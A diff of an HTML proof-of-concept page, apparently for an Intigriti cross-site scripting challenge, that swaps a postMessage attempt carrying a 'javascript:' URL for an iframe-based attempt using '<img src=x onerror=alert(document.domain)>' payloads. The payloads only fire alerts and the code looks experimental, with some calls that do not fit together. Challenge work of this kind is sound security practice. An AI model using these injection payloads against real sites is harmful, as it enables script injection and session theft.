@@ -1,26 +1,19 @@
 <html>
+
 <body>
-    <input type=button value="Click Me" id="btn">
+  <script>
+    var iframe = document.createElement('iframe');
+    iframe.name = 'helloworld';
+    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(document.domain)>'
+    iframe.srcdoc = '<img src=x onerror=alert(document.domain)>'
+//     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation allow-popups-to-escape-sandbox'
+    iframe.onclick = function(e){
+        var myWindow = window.open(this.contentWindow.name, 'javascript:alert(document.domain)');
+        myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
+    }
+    document.body.appendChild(iframe);
+  </script>
 </body>
 
-<script>
-document.getElementById('btn').onclick = function(e){
-    window.poc = window.open('https://challenge.intigriti.io/static/4/challenge.png?');
-    setTimeout(function(){
-        window.poc.postMessage(
-            {
-                "sender": "accounts",
-                "url": "javascript:confirm('XSS')",
-            },
-            '*'
-        );
-    }, 2000);
-}
-var i = document.createElement("iframe");
-i.onload = function(){
-  i.contentWindow.alert(1);
-}
-document.appendChild(i);
-</script>
-    
 </html>
+<!-- iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`; -->
